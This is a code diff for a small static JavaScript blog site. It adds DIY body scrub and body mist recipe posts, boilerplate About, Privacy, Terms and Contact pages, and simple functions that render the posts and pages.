+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Timing and Technique</h3>
+
+<p>Apply your scrub to slightly damp skin in the shower or bath, using gentle circular motions and focusing on rough areas like elbows, knees, and feet. Rinse thoroughly, pat your skin dry rather than rubbing, and follow immediately with a moisturizer or the body butter of your choice while skin is still slightly damp.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">How Often to Exfoliate</h4>
+
+<p>Two to three times a week is the sweet spot for most skin types. Exfoliating daily can strip natural oils and leave skin irritated, while going too long between sessions means dead skin has more time to build back up.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Keep your scrub jar in the shower rather than a cabinet. You are far more likely to actually use it two to three times a week if it is sitting right there within reach.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">A Few Safety Notes Before You Start</h2>
+
+<p>Skip body scrubs on sunburned, broken, or freshly waxed skin, and avoid using them on your face unless a recipe is specifically formulated for facial skin, since body scrubs tend to be far coarser. As always, staying hydrated and using sunscreen afterward helps protect newly exfoliated skin, which can be slightly more sensitive to the sun.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Points</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Coffee and matcha scrubs are best for energizing and brightening dull skin.</li>
+    <li>Sugar and oatmeal are the gentlest choices for sensitive or dry skin.</li>
+    <li>Salt and coconut scrubs work well on tougher, drier areas like heels and elbows.</li>
+    <li>Always moisturize right after scrubbing to lock in hydration.</li>
+    <li>Aim for two to three sessions a week, not daily.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>You do not need a drawer full of products to get glowing, smooth skin. A simple homemade scrub, chosen to match what your skin actually needs, can make a real difference in just a couple of weeks. Start with one or two of these recipes, build the habit into your shower routine, and let your skin do the talking.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Body Scrub</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Exfoliation Tips</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Skincare</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Glowing Skin</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Spa Day at Home</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Coffee Scrub</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Sensitive Skin Care</span>
+</div>
+                `
+            },
+            {
+                id: 'diy-coffee-body-scrub',
+                title: 'DIY Homemade Coffee Scrub for Silky Smooth Skin',
+                date: 'January 27, 2026',
+                image: './assets/DIY Homemade Coffee Scrub for Silky Smooth Skin.png',
+                excerpt: "Turn your morning coffee grounds into a skin-loving treat! ☕ This easy homemade coffee body scrub blends brown sugar, coffee, and coconut oil to gently exfoliate and boost circulation for silky smooth skin.<br>• Ready in just 4 simple steps with 4 ingredients<br>• Great for rough spots like elbows, knees, and feet<br>It's the ultimate spa day at home without the spa price tag. Save this recipe for your next self-care night! 💕",
+                content: `
+<p>There is something wonderfully satisfying about turning an everyday kitchen staple into a spa-worthy treat, and coffee body scrub is one of the easiest ways to do exactly that. With just brown sugar, coffee grounds, coconut oil, and an optional drop of essential oil, you can whip up a jar of exfoliating scrub in under ten minutes, no special equipment required.</p>
+
+<p>This scrub has earned its cult following for good reason. It smells incredible, feels indulgent in the shower, and leaves skin feeling genuinely smoother almost immediately. If you have never made your own body scrub before, this coffee version is the perfect place to start.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>This coffee scrub needs only four ingredients: brown sugar, coffee powder, coconut oil, and optional essential oil.</li>
+    <li>Coffee grounds gently exfoliate while the caffeine is thought to support circulation and reduce the look of tired skin.</li>
+    <li>Brown sugar softens the texture and dissolves easily, making the blend gentler than coffee alone.</li>
+    <li>The whole batch comes together in four simple steps and stores well in an airtight jar.</li>
+    <li>It is best used two to three times a week, focused on rough spots like elbows, knees, and feet.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Coffee Makes Such a Great Body Scrub</h2>
+
+<p>Used coffee grounds have a naturally coarse, gritty texture that makes them excellent at physically buffing away dead skin cells. Rather than throwing away your morning grounds, repurposing them into a scrub is both budget-friendly and satisfyingly resourceful. Many people also love the energizing, wake-up-your-senses scent that lingers in the shower.</p>
+
+<p>Beyond texture, coffee is often associated with supporting circulation when massaged into skin, which is part of why coffee scrubs are so popular for legs, arms, and other areas that can feel a little sluggish or tired-looking, especially after a long day on your feet.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Any exfoliating benefits from massage and texture are temporary and cosmetic. This scrub is a lovely self-care ritual, but it is not a medical treatment, so keep expectations realistic and enjoy it for the pampering experience it offers.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Ingredients You Will Need</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Just Four Simple Staples</h3>
+
+<ul>
+  <li><strong>1/2 cup brown sugar</strong> to gently exfoliate and soften the overall texture.</li>
+  <li><strong>1/4 cup coffee powder or used grounds</strong> to improve texture and add that signature coffee scent.</li>
+  <li><strong>1/4 cup coconut oil or olive oil</strong> to moisturize and nourish skin as you scrub.</li>
+  <li><strong>5 drops essential oil</strong>, optional, for extra fragrance such as vanilla or cinnamon.</li>
+</ul>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Choosing Between Coffee Powder and Used Grounds</h4>
+
+<p>Fresh or finely ground coffee gives a slightly finer, more consistent texture, while leftover grounds from your morning brew work just as well and cut down on waste. Either option delivers the same exfoliating result, so use whichever is easiest to keep on hand.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make Coffee Body Scrub in 4 Steps</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 1: Mix the Dry Ingredients</h3>
+
+<p>In a medium bowl, combine the brown sugar and coffee powder, stirring until evenly distributed. This dry mix is the exfoliating base for the whole scrub, so take a moment to break up any clumps of sugar or coffee.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 2: Add the Oil</h3>
+
+<p>Pour in the coconut oil, or olive oil if you prefer, and mix thoroughly until every granule is coated. The mixture should look like wet sand, thick enough to hold together but still easy to scoop and spread.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 3: Stir in Essential Oil</h3>
+
+<p>If using, add your essential oil now and stir again to distribute the scent evenly throughout the batch. This step is entirely optional, since the coffee itself already carries a rich, cozy aroma.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 4: Store and Enjoy</h3>
+
+<p>Transfer the finished scrub into an airtight container, and it is ready to use right away. No cooling or setting time needed, which makes this one of the fastest homemade beauty recipes you can put together.</p>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Note</h3>
+  <p style="margin:0;color:#334155;">If your coconut oil is solid because your kitchen is cool, gently warm it for a few seconds until it turns liquid before mixing. This makes it far easier to coat the sugar and coffee evenly.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Use Your Coffee Scrub</h2>
+
+<p>Wet your skin with warm water, then take a small amount of scrub and gently massage it in circular motions, paying extra attention to rough areas like elbows, knees, and feet. Rinse well and pat your skin dry, then follow with a moisturizer to lock in softness. Use it two to three times a week for best results, and avoid using it on your face, since this blend is formulated for tougher body skin.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Use this scrub right before shaving your legs. The gentle exfoliation lifts away dead skin and softens hair, which often leads to a closer, smoother shave.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Storage and Safety Tips</h2>
+
+<p>Keep your coffee scrub in a sealed jar in a cool, dry spot, and it should stay fresh for several weeks. Always scoop with a clean spoon rather than wet fingers to avoid introducing water and bacteria into the jar. As always, do a quick patch test if you are trying a new essential oil for the first time, and skip using the scrub on any freshly shaved, sunburned, or broken skin.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Only four ingredients, ready in under ten minutes.</li>
+    <li>No cooling or setting time required before use.</li>
+    <li>Best used two to three times a week, not on the face.</li>
+    <li>Great as a pre-shave treatment for smoother results.</li>
+    <li>Stores for several weeks in a sealed, airtight jar.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>This coffee body scrub proves that a genuinely spa-worthy self-care ritual does not need a long ingredient list or a trip to the store. With staples you likely already have in your pantry, you can turn a regular shower into something that feels a little more special. Make a batch this week, keep it by the shower, and enjoy the simple luxury of silky, smooth skin.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Coffee Scrub</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Beauty Recipes</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Homemade Skincare</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Exfoliating Scrub</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Care at Home</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Smooth Skin Tips</span>
+</div>
+                `
+            },
+            {
+                id: 'diy-body-mist-recipes',
+                title: '7 DIY Natural Body Mist Recipes for a Fresh Glow',
+                date: 'May 30, 2026',
+                image: './assets/7 DIY Natural Body Mist Recipes for a Fresh Glow.png',
+                excerpt: "Smell amazing, naturally! 🌸 These 7 DIY body mist recipes, from rose & aloe to hibiscus glow, are chemical-free, budget-friendly, and so easy to customize for any mood or season.<br>• Made with simple ingredients like witch hazel, essential oils, and distilled water<br>• Ready in minutes, no funnel required<br>Keep your signature scent fresh all day. Save for later and start spritzing! 💗",
+                content: `
+<p>Store-bought body sprays are often packed with synthetic fragrance and ingredients that can be hard to pronounce, let alone understand. A homemade body mist flips that entirely, giving you a light, refreshing scent made from things like rose water, witch hazel, and pure essential oils, with nothing hiding behind a mystery fragrance label.</p>
+
+<p>Better yet, a single spray bottle takes just a few minutes to put together and costs a fraction of what you would spend on a designer body mist. Below are seven natural recipes to match every mood, from calming lavender for bedtime to energizing citrus for busy mornings, plus everything you need to know about making them last.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>DIY body mists are built from a simple base of distilled water, witch hazel or aloe, and a few drops of essential oil.</li>
+    <li>Each of the seven recipes below is designed for a different mood, from energizing mornings to calming bedtime routines.</li>
+    <li>Homemade mists are chemical-free, budget-friendly, and fully customizable to your favorite scent combinations.</li>
+    <li>Because there is no alcohol-based preservative, these mists are best made in small batches and used within two to four weeks.</li>
+    <li>Shaking the bottle before every use keeps the natural ingredients evenly distributed.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Make Your Own Body Mist</h2>
+
+<p>Commercial body sprays typically rely on synthetic fragrance blends and alcohol bases that can feel harsh on sensitive skin. A homemade version lets you control exactly what goes into the bottle, which is especially appealing if you are trying to simplify your routine or avoid ingredients that tend to irritate you.</p>
+
+<p>There is also the fun factor. Mixing your own scent combinations means you can build a genuinely personal signature fragrance, layer different mists depending on the season, or whip up a thoughtful handmade gift that feels far more special than anything off a shelf.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Essential oils should always be diluted before going anywhere near skin, and a body mist is no exception. Stick to the small drop amounts in each recipe rather than adding extra for a stronger scent.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">7 DIY Natural Body Mist Recipes</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Rose & Aloe Body Mist</h3>
+
+<p>Rose water, aloe vera gel, and a few drops of rose essential oil come together in a soothing, hydrating spray that works beautifully on all skin types. It is subtle, floral, and gentle enough to use right after a shower.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Citrus Fresh Body Mist</h3>
+
+<p>Sweet orange and lemon essential oils blended with witch hazel create an uplifting, energizing scent that is perfect for mornings or right after a workout when you need a quick pick-me-up.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Lavender Calm Body Mist</h3>
+
+<p>Lavender hydrosol, witch hazel, and lavender essential oil combine into a calming, relaxing mist that is ideal right before bed or during a stressful afternoon when you need a moment to reset.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Vanilla Coconut Body Mist</h3>
+
+<p>Vegetable glycerin, a touch of vanilla extract, and coconut fragrance oil create a warm, cozy scent with a sweet tropical touch, perfect for anyone who loves a comforting, dessert-like fragrance.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">5. Jasmine Green Tea Mist</h3>
+
+<p>Cooled green tea, jasmine hydrosol, and jasmine essential oil result in a refreshing, delicate scent that feels light and confidence-boosting enough for everyday wear.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">6. Cucumber Mint Summer Mist</h3>
+
+<p>Cucumber hydrosol and a few drops of peppermint essential oil combine into a cool, refreshing spray that is especially lovely on hot days or after too much time in the sun.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">7. Hibiscus Glow Body Mist</h3>
+
+<p>Cooled hibiscus tea, rose water, and hibiscus fragrance or essential oil create a floral, vibrant mist that leaves a natural, all-day glow-feel behind.</p>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;color:#334155;">Because these mists skip synthetic preservatives, they behave more like fresh, perishable products than shelf-stable perfume. Treating them that way, with small batches and cool storage, is what keeps them smelling their best.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make Any Body Mist</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step-by-Step Mixing</h3>
+
+<p>Add all ingredients directly into a clean spray bottle, ideally glass or dark plastic to protect the essential oils from light. Shake well before each use, since the water and oil components will naturally separate over time. Spray on your body and clothing from a short distance for even coverage.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Choosing the Right Bottle</h4>
+
+<p>A fine-mist glass spray bottle works best, since plastic can sometimes react with concentrated essential oils over time. Amber or cobalt glass also helps protect the blend from sunlight, which extends its freshness.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Store your body mist in the fridge if you want it to last closer to the four-week mark. The cool temperature slows down any natural breakdown of the plant-based ingredients.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Storage, Shelf Life, and Best Times to Use</h2>
+
+<p>Most homemade body mists are best used within two to four weeks, since there is no strong preservative system keeping them shelf-stable long term. Keep bottles away from direct sunlight and heat, always patch test new essential oil combinations, and keep sprays away from your eyes.</p>
+
+<p>These mists work beautifully any time of day. Try citrus in the morning, lavender before bed, and cucumber mint after a shower or a day outdoors. Because they are so quick to make, it is easy to keep a small rotation on hand for whatever mood or season fits.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Points</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Base formula: water or hydrosol, witch hazel or aloe, plus a few drops of essential oil.</li>
+    <li>Use within two to four weeks, and store in the fridge for extra freshness.</li>
+    <li>Always shake before spraying, since natural ingredients settle and separate.</li>
+    <li>Match the scent to the moment, citrus for mornings, lavender for bedtime.</li>
+    <li>Glass spray bottles protect the blend better than plastic over time.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>A homemade body mist is one of the simplest ways to add a little joy to your daily routine. With just a few natural ingredients and a spray bottle, you can build a rotation of scents that feels genuinely yours, chemical-free, budget-friendly, and easy to refresh whenever the mood strikes. Pick a recipe that matches how you want to feel today and give it a try.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Body Mist</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Fragrance</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Chemical Free Beauty</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Essential Oil Recipes</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Homemade Perfume</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Care Rituals</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Signature Scent</span>
+</div>
+                `
+            }
+
+        ];
+
+        // Static Legal Pages (Required for AdSense & Pinterest)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>Daily Life Handcrafted</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share simple, natural recipes for skincare, self-care, and everyday handmade living.</p>
+                    <p>Whether you are here to whip up your first batch of body butter, find a new DIY gift idea, or just enjoy some slow, cozy inspiration, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and a little self-care.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At Daily Life Handcrafted, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:hello@dailylifehandcrafted.com">hello@dailylifehandcrafted.com</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Daily Life Handcrafted";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // A placeholder avatar
+
+        // Function to render the home page (list of posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (like Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+
+            if (!page) {
+                app.innerHTML = `<p style="color: white;">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 30px; padding-bottom: 30px;">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Function to render a single post
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+
+            if (!post) {
+                app.innerHTML = `<p style="color: white;">Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
